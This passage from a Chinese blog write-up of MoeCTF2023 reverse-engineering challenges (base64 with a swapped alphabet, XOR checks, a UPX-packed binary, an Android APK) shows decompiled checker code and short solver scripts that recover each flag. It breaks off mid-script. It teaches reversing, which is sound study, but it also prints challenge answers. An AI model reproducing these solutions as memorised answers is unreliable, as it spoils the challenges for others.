os.path.join(output_directory, os.listdir(output_directory)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;套娃压缩包已成功解压并前一个压缩包已删除。&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/30.png"></p>

        <h1 id="Reverse">
          <a href="#Reverse" class="heading-link"><i class="fas fa-link"></i></a><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1>
      
        <h2 id="Reverse入门指北">
          <a href="#Reverse入门指北" class="heading-link"><i class="fas fa-link"></i></a><a href="#Reverse入门指北" class="headerlink" title="Reverse入门指北"></a>Reverse入门指北</h2>
      <p>此时将该程序拖入IDA，此时从mian函数先看起，此时发现只要我们输入13，即可输出<br><img src="/2023/08/18/MoeCTF2023/36.png"><br>接下来我们跟进输出看看输出的是否为flag<br><img src="/2023/08/18/MoeCTF2023/37.png"></p>

        <h2 id="base-64">
          <a href="#base-64" class="heading-link"><i class="fas fa-link"></i></a><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h2>
      <p>此时打开为一个pyc的文件，我们需要对其进行一个反编译，使用在线网站对其进行一个反编译，编译之后源码如下</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line">str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;welcome to moectf\ninput your flag and I wiil check it:&#x27;</span>)</span><br><span class="line">enc_flag = base64.b64encode(flag.encode()).decode()</span><br><span class="line">enc_flag = enc_flag.translate(<span class="built_in">str</span>.maketrans(string2, string1))</span><br><span class="line"><span class="keyword">if</span> enc_flag == str1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;good job!!!!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;something wrong???&#x27;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>

        <h3 id="py代码审计">
          <a href="#py代码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#py代码审计" class="headerlink" title="py代码审计"></a>py代码审计</h3>
      <p>此时阅读源码之后发现是要求 我们输入的字符串经过程序的加密之后的值要与str1一样；此时我们来看它的加密步骤，此时是先将用户输入的”flag”字符串先转换为字节编码，然后使用Base64编码进行加密，最后将加密后的结果转换为字符串。然后将加密后的Base64字符串中的字符按照string2到string1的映射进行替换。<br>所以此时我们的目的很明确，就是我们输入的字符串在经过程序的处理之后值为str1,那么此时我们可以将该程序逆过来，将str1作为我们的输入，然后经过base64的解码之后在做一个映射即可</p>

        <h3 id="exp">
          <a href="#exp" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp" class="headerlink" title="exp"></a>exp</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64_decode</span>(<span class="params">encoded_str, custom_charset</span>):</span><br><span class="line">    standard_charset = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create a translation table to map characters from custom charset to standard charset</span></span><br><span class="line">    translation_table = <span class="built_in">str</span>.maketrans(custom_charset, standard_charset)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Translate the encoded string back to standard Base64</span></span><br><span class="line">    standard_encoded = encoded_str.translate(translation_table)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Decode the standard Base64 encoded string</span></span><br><span class="line">    decoded_bytes = base64.b64decode(standard_encoded)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> decoded_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)  <span class="comment"># Decode the bytes to a UTF-8 string</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">custom_encoded_str = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span>  <span class="comment"># Replace with your encoded string</span></span><br><span class="line">custom_charset = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">decoded_text = custom_base64_decode(custom_encoded_str, custom_charset)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded Text:&quot;</span>, decoded_text)</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/38.png"></p>

        <h2 id="Xor">
          <a href="#Xor" class="heading-link"><i class="fas fa-link"></i></a><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h2>
      <p>此时依旧从main函数开始看起，此时要求我们输入一个数组，并且该数组中的每一个元素与0x39进行异或，异或完的值要与<code>enc[i]</code>相等<br><img src="/2023/08/18/MoeCTF2023/39.png"><br>此时我们可以观察一下enc数组内的值<br><img src="/2023/08/18/MoeCTF2023/40.png"><br>此时我们可以写一个异或脚本来输出我们应该输入的值</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_xor_operand_hex</span>(<span class="params">known_xor_hex, known_operand_hex</span>):</span><br><span class="line">    known_xor = <span class="built_in">int</span>(known_xor_hex, <span class="number">16</span>)</span><br><span class="line">    known_operand = <span class="built_in">int</span>(known_operand_hex, <span class="number">16</span>)</span><br><span class="line">    unknown_operand = known_xor ^ known_operand</span><br><span class="line">    <span class="keyword">return</span> unknown_operand</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的异或结果和操作数（以十六进制表示）</span></span><br><span class="line">known_xor_result_hex = <span class="string">&#x27;0x10&#x27;</span></span><br><span class="line">known_operand_hex = <span class="string">&#x27;0x39&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 求解另一个操作数</span></span><br><span class="line">unknown_operand = find_xor_operand_hex(known_xor_result_hex, known_operand_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以十六进制形式输出未知操作数</span></span><br><span class="line">unknown_operand_hex = <span class="built_in">hex</span>(unknown_operand)[<span class="number">2</span>:].upper()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;The unknown operand in hexadecimal is: <span class="subst">&#123;unknown_operand_hex&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>
<p>接下来根据这个脚本我们得到了我们需要输入的值</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x6D,0x6F,0x65,0x63,0x74,0x66,0x7B,0x59,0x6F,0x75,0x5F,0x6B,0x6E,0x30,0x77,0x5F,0x68,0x30,0x77,0x5F,0x74,0x30,0x5F,0x58,0x30,0x52,0x21,0x7D,0x29</span><br></pre></td></tr></table></div></figure>
<p>接下来输出他们即可</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> input[] = &#123; <span class="number">0x6D</span>, <span class="number">0x6F</span>, <span class="number">0x65</span>, <span class="number">0x63</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x7B</span>, <span class="number">0x59</span>, <span class="number">0x6F</span>, <span class="number">0x75</span>, <span class="number">0x5F</span>, <span class="number">0x6B</span>, <span class="number">0x6E</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x5F</span>, <span class="number">0x68</span>, <span class="number">0x30</span>, <span class="number">0x77</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x30</span>, <span class="number">0x5F</span>, <span class="number">0x58</span>, <span class="number">0x30</span>, <span class="number">0x52</span>, <span class="number">0x21</span>, <span class="number">0x7D</span>, <span class="number">0x29</span> &#125;;</span><br><span class="line">    <span class="type">int</span> input_size = <span class="keyword">sizeof</span>(input) / <span class="keyword">sizeof</span>(input[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;输入的数组内容为：\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; input_size; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, input[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/41.png"></p>

        <h2 id="UPX！">
          <a href="#UPX！" class="heading-link"><i class="fas fa-link"></i></a><a href="#UPX！" class="headerlink" title="UPX！"></a>UPX！</h2>
      
        <h3 id="查壳">
          <a href="#查壳" class="heading-link"><i class="fas fa-link"></i></a><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3>
      <p>此时因为题目给出了upx，所以此时我们先查一下壳<br><img src="/2023/08/18/MoeCTF2023/42.png"></p>

        <h3 id="脱壳">
          <a href="#脱壳" class="heading-link"><i class="fas fa-link"></i></a><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3>
      <p>此时提示我们存在壳需要脱壳<br><img src="/2023/08/18/MoeCTF2023/43.png"></p>

        <h3 id="IDA逆向分析">
          <a href="#IDA逆向分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#IDA逆向分析" class="headerlink" title="IDA逆向分析"></a>IDA逆向分析</h3>
      <p>此时先使用shift+f12看看有啥，此时发现了moectf的相关线索<br><img src="/2023/08/18/MoeCTF2023/44.png"><br>此时跳转到该地址之后按下f5反汇编为c语言</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_140079760</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+20h] [rbp+0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">76</span>]; <span class="comment">// [rsp+28h] [rbp+8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+74h] [rbp+54h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+148h] [rbp+128h]</span></span><br><span class="line"></span><br><span class="line">  v0 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">34</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v0 = <span class="number">-858993460</span>;</span><br><span class="line">    v0 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140075557(&amp;unk_1401A7008);</span><br><span class="line">  sub_140073581(<span class="string">&quot;welcome to moectf&quot;</span>);</span><br><span class="line">  sub_140073581(<span class="string">&quot;I put a shell on my program to prevent you from reversing it, you will never be able to reverse it hhhh~~&quot;</span>);</span><br><span class="line">  sub_140073581(<span class="string">&quot;Now tell me your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">0x2A</span>ui64);</span><br><span class="line">  sub_1400727F8(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = j;</span><br><span class="line">    v2 = sub_140073829(v6);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt;= v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6[j] ^= <span class="number">0x67</span>u;</span><br><span class="line">    <span class="keyword">if</span> ( byte_140196000[j] != v6[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_140073973(<span class="string">&quot;try again~~&quot;</span>);</span><br><span class="line">      sub_1400723F7(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140073973(<span class="string">&quot;you are so clever!&quot;</span>);</span><br><span class="line">  sub_140074BCF(v4, &amp;unk_140162070);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

        <h3 id="c代码审计">
          <a href="#c代码审计" class="heading-link"><i class="fas fa-link"></i></a><a href="#c代码审计" class="headerlink" title="c代码审计"></a>c代码审计</h3>
      <p>此时我们将注意力集中到下面这个验证代码<br><img src="/2023/08/18/MoeCTF2023/45.png"><br>此时是将我们输入的数做一个异或的操作，要求我们输入的值经过异或操作之后要与<code>byte_140196000[j]</code>数组中的值相等；此时我们跳转到该数组<br><img src="/2023/08/18/MoeCTF2023/46.png"><br>此时该情况和上面的Xor差不多，较为迷惑人的是这个<code>3 dum(&#39;F&#39;)</code>;我在这里也卡了比较久，经过尝试之后发现是F’,’F’,’F’；所以此时我们已经知道<br>异或的操作数和结果；此时我们可以将他们两个做异或来输出我们的flag，跟上面那题Xor一样的思路</p>

        <h3 id="exp-1">
          <a href="#exp-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[] = &#123; <span class="number">0x0a</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">0x13</span>,<span class="number">1</span>,<span class="number">0x1c</span>,<span class="string">&#x27;W&#x27;</span>,<span class="number">0x0F</span>,<span class="string">&#x27;8&#x27;</span>,<span class="number">0x1e</span>,<span class="string">&#x27;W&#x27;</span>,<span class="number">0x12</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="number">9</span>,<span class="string">&#x27;W&#x27;</span>,<span class="number">0x10</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="number">0x10</span>,<span class="string">&#x27;8&#x27;</span>,<span class="number">0x13</span>,<span class="number">8</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="number">2</span>,<span class="number">0x11</span>,<span class="string">&#x27;T&#x27;</span>,<span class="number">0x15</span>,<span class="number">0x14</span>,<span class="number">2</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="number">0x1a</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">41</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, a[i] ^ <span class="string">&#x27;g&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p><img src="/2023/08/18/MoeCTF2023/47.png"></p>

        <h2 id="ANDROID">
          <a href="#ANDROID" class="heading-link"><i class="fas fa-link"></i></a><a href="#ANDROID" class="headerlink" title=" ANDROID"></a> ANDROID</h2>
      
        <h3 id="MainActivity的寻找">
          <a href="#MainActivity的寻找" class="heading-link"><i class="fas fa-link"></i></a><a href="#MainActivity的寻找" class="headerlink" title="MainActivity的寻找"></a>MainActivity的寻找</h3>
      <p> 对于android的入门题目，我们只需要找到函数的入口MainActivity;这个时候我们可以先安装一下这个apk看看存在什么事件；此时发现存在onClick点击事件<br><img src="/2023/08/18/MoeCTF2023/48.png"><br>此时我们使用jadx将apk进行反编译然后寻找MainActivity的onClick事件</p>

        <h3 id="代码审计-1">
          <a href="#代码审计-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.doctor3.basicandroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] enc = &#123;<span class="number">25</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="string">&#x27;/&#x27;</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">28</span>, <span class="number">21</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">16</span>&#125;;</span><br><span class="line">    <span class="type">char</span>[] key = &#123;<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;y&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(R.id.input);</span><br><span class="line">        ((Button) findViewById(R.id.check)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.doctor3.basicandroid.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">obj</span> <span class="operator">=</span> editText.getText().toString();</span><br><span class="line">                <span class="keyword">if</span> (obj.length() != <span class="number">31</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;长度不对哦&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">byte</span>[] bytes = obj.getBytes();</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">31</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((bytes[i] ^ MainActivity.<span class="built_in">this</span>.key[i % MainActivity.<span class="built_in">this</span>.key.length]) != MainActivity.<span class="built_in">this</span>.enc[i]) &#123;</span><br><span class="line">                        Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;好像有哪里不对&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;恭喜！回答正确&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>此时我们将注意力集中在这个恭喜回到正确的判断中<br><img src="/2023/08/18/MoeCTF2023/49.png"><br>此时我们可以先看一下这个判断过程，它要求我们一定要输入长度为31的字符串，然后在进行异或时将我们输入的第几个数组元素与key中的元素个数取余后进行一个异或操作并且要求我们异或的结果要与enc数组中的对应元素相等(讲得有点乱)就是数组中第几个元素要相对应；这个不久跟上面几题都一样执<br>行的都是异或的操作并且知道异或的操作数和异或值，那么此时我们可以将异或的操作数和结果异或就可以得到我们的输入值</p>

        <h3 id="exp-2">
          <a href="#exp-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> enc[<span class="number">31</span>] = &#123; <span class="number">25</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">16</span>, <span class="string">&#x27;/&#x27;</span>, <span class="number">24</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="number">11</span>, <span class="number">29</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="number">24</span>, <span class="string">&#x27;:&#x27;</span>, <span class="number">28</span>, <span class="number">21</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">16</span> &#125;;</span><br><span class="line"><span class="type">char</span> key[<span class="number">9</span>] = &#123; <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;y&#x27;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">char</span>* enc, <span class="type">int</span> encLen, <span class="type">const</span> <span class="type">char</span>* key, <span class="type">int</span> keyLen)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; encLen; i++) &#123;</span><br><span class="line">        enc[i] ^= key[i % keyLen]; <span class="comment">// 